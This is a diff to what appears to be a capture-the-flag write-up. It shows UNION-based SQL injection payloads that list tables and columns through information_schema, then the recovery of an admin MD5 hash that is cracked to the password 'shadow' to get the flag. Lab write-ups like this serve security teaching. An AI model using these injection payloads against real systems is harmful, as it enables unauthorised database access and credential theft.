@@ -13,7 +13,7 @@ null union select null,table_name from information_schema.tables where
  table_schema=0x4d656d6265725f42727574655f466f726365
 ```
 * List columns in `db_default` table
-`db_default` <-> `0x64625f64656661756c74`
+(`db_default` <-> hex `0x64625f64656661756c74`)
 ```sql
 null union select null,column_name from information_schema.columns where table_name=0x64625f64656661756c74
 ```
@@ -29,8 +29,7 @@ password: 3bf1114a986ba87ed28fc1b5884fc2f8
 username: admin
 password: 3bf1114a986ba87ed28fc1b5884fc2f8
 ```
-* Find corresponding string for this hash https://md5hashing.net/hash/md5
-/3bf1114a986ba87ed28fc1b5884fc2f8
+* Find corresponding string for this hash https://md5hashing.net/hash/md5/3bf1114a986ba87ed28fc1b5884fc2f8
 * MD5 `3bf1114a986ba87ed28fc1b5884fc2f8` <-> `shadow`
 * Sign in with either `admin` or `root` as username and `shadow` as password
 * Get the flag
